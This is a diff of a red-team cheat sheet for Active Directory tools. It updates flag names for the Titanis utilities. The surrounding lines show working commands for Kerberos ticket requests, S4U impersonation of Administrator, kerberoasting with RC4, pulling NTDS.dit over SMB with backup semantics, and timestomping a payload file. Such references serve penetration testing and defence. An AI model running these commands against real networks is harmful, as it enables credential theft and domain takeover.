@@ -102,7 +102,7 @@
 | SOCKS5 | `proxychains` prefix | `-Socks5 host:port` | n/a | `?proxytype=socks5&proxyhost=...&proxyport=...` | `set Proxies socks5:127.0.0.1:1080` | `?proxyhost=127.0.0.1&proxyport=1080` |
 | SOCKS4 | n/a | n/a | n/a | n/a | n/a | `?proxytype=socks4&proxyhost=127.0.0.1&proxyport=1080` |
 | Encrypt RPC | n/a | `-EncryptRpc` | n/a | n/a | auto | n/a (SMB signing negotiated automatically) |
-| Backup semantics | n/a | `-BackupSemantics` | n/a | n/a | n/a | n/a |
+| Backup semantics | n/a | `-BackupSemantics` (Reg) / `-UseBackupSemantics` (Smb2Client) | n/a | n/a | n/a | n/a |
 | Anonymous bind | limited | undocumented | n/a | `ldap://192.168.1.1` | n/a | n/a |
 | QUIC (Azure) | n/a | n/a | n/a | n/a | n/a | `smb+quic+ntlm-password://DOMAIN\user:Pass@host` |
 
@@ -364,7 +364,7 @@ minikerberos-getTGS \
 
 # Titanis
 Kerb tgsreq -Kdc 192.168.1.1 -Tgt jdoe-tgt.kirbi \
-  cifs/fileserver.domain.local -OutputFile jdoe-fileserver.kirbi
+  cifs/fileserver.domain.local -OutputFileName jdoe-fileserver.kirbi
 ```
 
 [↑ Back to Index](#index)
@@ -395,7 +395,7 @@ minikerberos-getS4U2proxy \
 # Titanis — combined self+proxy
 Kerb tgsreq -Kdc 192.168.1.1 -Tgt svc-tgt.kirbi \
   -S4UserName Administrator@DOMAIN cifs/target.domain.local \
-  -OutputFile admin-target.kirbi
+  -OutputFileName admin-target.kirbi
 ```
 
 [↑ Back to Index](#index)
@@ -453,7 +453,7 @@ Kerb asreq -UserName jdoe -Realm DOMAIN -Password Password123 \
 while IFS= read -r spn; do
   safe=$(echo "$spn" | tr '/:@' '_')
   kerb tgsreq -Kdc 192.168.1.1 -Tgt jdoe-tgt.kirbi \
-    -EncTypes Rc4Hmac "$spn" -OutputFile "roast_${safe}.kirbi"
+    -EncTypes Rc4Hmac "$spn" -OutputFileName "roast_${safe}.kirbi"
 done < spns.txt
 Kerb select -From roast_*.kirbi -Into kerberoast-all.ccache
 minikerberos-ccacheroast kerberoast-all.ccache
@@ -836,7 +836,7 @@ For locked or protected files (NTDS.dit, SYSTEM hive, etc.).
 ```bash
 # Titanis
 Smb2Client get \\192.168.1.10\C$\Windows\NTDS\ntds.dit ntds.dit \
-  -UserName jdoe -UserDomain DOMAIN -Password Password123 -BackupSemantics
+  -UserName jdoe -UserDomain DOMAIN -Password Password123 -UseBackupSemantics
 ```
 
 [↑ Back to Index](#index)
@@ -978,7 +978,7 @@ smbclient-ng --host 192.168.1.10 -u jdoe -p Password123 --domain DOMAIN \
 
 # Titanis
 Smb2Client touch \\192.168.1.10\C$\Windows\Temp\payload.exe \
-  -UserName jdoe -UserDomain DOMAIN -Password Password123 -Time "2022-01-01 00:00:00"
+  -UserName jdoe -UserDomain DOMAIN -Password Password123 -LastWriteTimestamp "2022-01-01 00:00:00"
 ```
 
 [↑ Back to Index](#index)
